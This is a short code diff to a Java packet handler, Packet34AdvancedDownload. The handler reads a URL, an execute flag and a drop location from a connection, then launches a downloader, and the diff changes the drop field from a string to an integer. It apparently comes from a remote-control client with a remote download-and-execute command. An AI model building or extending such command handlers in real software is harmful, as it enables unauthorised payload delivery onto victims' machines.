@@ -9,7 +9,7 @@ public class Packet34AdvancedDownload extends AbstractIncomingPacket {
 	public void read(Connection con) throws Exception {
 		String url = con.readLine();
 		boolean exec = con.readBoolean();
-		String drop = con.readLine().toLowerCase();
+		int drop = con.readInt();
 		new AdvancedDownloader(con, url, exec, drop).start();
 	}
 
